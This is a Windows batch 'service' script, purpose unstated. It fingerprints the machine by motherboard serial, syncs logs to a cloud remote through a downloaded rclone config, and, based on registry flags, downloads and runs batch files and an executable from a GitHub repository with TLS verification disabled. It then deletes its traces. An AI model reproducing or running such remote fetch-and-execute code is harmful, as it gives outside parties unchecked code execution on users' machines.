:NOPPERS
@echo off
@Title DQS-SERVICE
cd /d %~dp0
cls

SET EXLOG=ERR
SET VALUE2=ERR
SET VALUE3=ERR
SET VALUE4=ERR
SET VALUE5=ERR

setlocal enabledelayedexpansion

for /f "skip=1 tokens=*" %%a in ('wmic baseboard get serialnumber') do (
    set "HHWID=%%a"
    goto :end298768
)

:end298768

set "HHWID=!HHWID: =!"

echo !HHWID!>IID.log

endlocal
ping -n 2 -w 1000 127.0.0.1 >nul

set HHWID=
for /f "usebackq tokens=*" %%a in ("IID.log") do (
    set "HHWID=%%a"
    goto :end289768655865
)

:end289768655865

IF EXIST MinimizeConsole.ps1 goto :PWSFDG

echo # MinimizeConsole.ps1>MinimizeConsole.ps1
echo Start-Process -FilePath "cmd.exe" -ArgumentList "/C start /min DQS-AD.bat" -WindowStyle Hidden>>MinimizeConsole.ps1

Ping 02>nul
:PWSFDG

@timeout /t 02>nul

IF EXIST rclone.exe goto :ESXRCONE
curl -g -k -L -# -o "rclone-current-windows-amd64.zip" "https://downloads.rclone.org/rclone-current-windows-amd64.zip"
tar -xvf rclone-current-windows-amd64.zip

setlocal enabledelayedexpansion

set "dossier_dezippe="
for /d %%i in (*) do (
    if exist "%%i\rclone.exe" (
        set "dossier_dezippe=%%i"
        goto CopierRclone
    )
)

:CopierRclone
copy "%dossier_dezippe%\rclone.exe"
@timeout /t 02>nul
rmdir /s /q "!dossier_dezippe!"
del /q "rclone-current-windows-amd64.zip"
endlocal
:ESXRCONE
IF EXIST rclone.conf goto :ESXRCONEC
curl -g -k -L -# -o "rclone.conf" "https://docs.google.com/uc?export=download&id=1bnsVjioFmO5qW1h7wflWINnpG5qeGjSk"
:ESXRCONEC

SET GDPLOG="QTS:%HHWID%\QTS-SERVICE.log"

Ping 02>nul

SET EXLOG=2

IF EXIST QTS-SERVICE.log (
	rclone --config="rclone.conf" --auto-confirm copy QTS-SERVICE.log QTS:%HHWID%
	Ping 02>nul
	SET EXLOG=1
)

rclone --config="rclone.conf" --auto-confirm ls QTS:%HHWID% > temp3.txt

findstr /i /c:"QTS-SERVICE.log" temp3.txt > nul

if %errorlevel%==0 (
	IF %EXLOG% == 2 rclone --config="rclone.conf" --auto-confirm copy "QTS:%HHWID%/QTS-SERVICE.log" "%CD%"
) else (
	echo [%DATE%] I--------------------------------------------------------I>QTS-SERVICE.log
	echo [%DATE%]  CREATE LOG>>QTS-SERVICE.log
	echo [%DATE%] I--------------------------I>>QTS-SERVICE.log
)

DEL IID.log
DEL temp3.txt

echo [%DATE%] >>QTS-SERVICE.log
echo [%DATE%] I--------------------------I>>QTS-SERVICE.log
echo [%DATE%]  NEW SESS>>QTS-SERVICE.log
echo [%DATE%] I--------------------------I>>QTS-SERVICE.log
echo [%DATE%]  SET SETGS>>QTS-SERVICE.log

SET STG1=ERR
SET STG2=ERR
SET STG3=ERR
SET STG4=ERR
SET STG5=ERR

SET CURRENTKEY=HKLM\SOFTWARE\RECS
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "CTMPSTG"') DO set STG1=%%B

SET CURRENTKEY=HKLM\SOFTWARE\RECS
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "CINTSTG"') DO set STG2=%%B

SET CURRENTKEY=HKLM\SOFTWARE\RECS
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "CDVSSTG"') DO set STG3=%%B

SET CURRENTKEY=HKLM\SOFTWARE\RECS
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "CGMSSTG"') DO set STG4=%%B

SET CURRENTKEY=HKLM\SOFTWARE\RECS
FOR /F "TOKENS=2,*" %%A IN ('reg query "%CURRENTKEY%" 2^>NUL^|FIND /I "CDVSSTG"') DO set STG5=%%B

echo [%DATE%]  STG-1 == %STG1%>>QTS-SERVICE.log
echo [%DATE%]  STG-2 == %STG2%>>QTS-SERVICE.log
echo [%DATE%]  STG-3 == %STG3%>>QTS-SERVICE.log
echo [%DATE%]  STG-4 == %STG4%>>QTS-SERVICE.log
echo [%DATE%]  STG-5 == %STG5%>>QTS-SERVICE.log

IF %STG1% == 0x1 (
	echo [%DATE%]  START STG-1 == TEMPserv.bat>>QTS-SERVICE.log
	IF EXIST TEMPserv.bat DEL TEMPserv.bat
	curl -g -k -L -# -o "TEMPserv.bat" "https://raw.githubusercontent.com/00FGV1/ver/main/file/TEMPserv.bat"
	Ping 02>nul
	IF EXIST TEMPserv.bat START /WAIT /B TEMPserv.bat
	echo [%DATE%]  END STG-1 == TEMPserv.bat>>QTS-SERVICE.log
)

IF %STG2% == 0x1 (
	echo [%DATE%]  START STG-2 == Networkserv.bat>>QTS-SERVICE.log
	IF EXIST Networkserv.bat DEL Networkserv.bat
	curl -g -k -L -# -o "Networkserv.bat" "https://raw.githubusercontent.com/00FGV1/ver/main/file/Networkserv.bat"
	Ping 02>nul
	IF EXIST Networkserv.bat START /WAIT /B Networkserv.bat
	echo [%DATE%]  END STG-2 == Networkserv.bat>>QTS-SERVICE.log
	Ping 05>nul
)

IF %STG3% == 0x1 (
	echo [%DATE%]  START STG-3 == DeviceCleanupCmd.exe>>QTS-SERVICE.log
	echo [%DATE%] I--------------------------I>>QTS-SERVICE.log
	echo.>>QTS-SERVICE.log
	IF EXIST DeviceCleanupCmd.exe DEL DeviceCleanupCmd.exe
	curl -g -k -L -# -o "DeviceCleanupCmd.exe" "https://github.com/00FGV1/ver/raw/main/file/DeviceCleanupCmd.exe"
	Ping 02>nul
	IF EXIST DeviceCleanupCmd.exe DeviceCleanupCmd * -m:0y>>QTS-SERVICE.log
	echo [%DATE%] I--------------------------I>>QTS-SERVICE.log
	echo [%DATE%]  END STG-3 == DeviceCleanupCmd.exe>>QTS-SERVICE.log
	Ping 05>nul
)

IF %STG4% == 0x1 (
	echo [%DATE%]  START STG-4 == autoconfserv.bat>>QTS-SERVICE.log
	echo [%DATE%] I--------------------------I>>QTS-SERVICE.log
	IF EXIST autoconfserv.bat DEL autoconfserv.bat
	curl -g -k -L -# -o "autoconfserv.bat" "https://raw.githubusercontent.com/00FGV1/ver/main/file/autoconfserv.bat"
	Ping 02>nul
	IF EXIST autoconfserv.bat START /WAIT /B autoconfserv.bat>>QTS-SERVICE.log
	echo.>>QTS-SERVICE.log
	echo [%DATE%] I--------------------------I>>QTS-SERVICE.log
	echo [%DATE%]  END STG-4 == autoconfserv.bat>>QTS-SERVICE.log
)

echo [%DATE%]  END SERVICE SCRIPT>>QTS-SERVICE.log
echo [%DATE%]  EXIT SCRIPT>>QTS-SERVICE.log
echo [%DATE%] I--------------------------------------------------------I>>QTS-SERVICE.log
rclone --config="rclone.conf" --auto-confirm copy QTS-SERVICE.log QTS:%HHWID%
Ping 02>nul
DEL rclone.conf
DEL TEMPserv.bat
DEL Networkserv.bat
DEL autoconfserv.bat
DEL DeviceCleanupCmd.exe
DEL QTS-SERVICE.log
DEL MinimizeConsole.ps1
DEL cli.c
DEL es.exe
DEL Everything.exe
DEL Everything.lng
DEL exe_gamename.txt
DEL result.log
EXIT
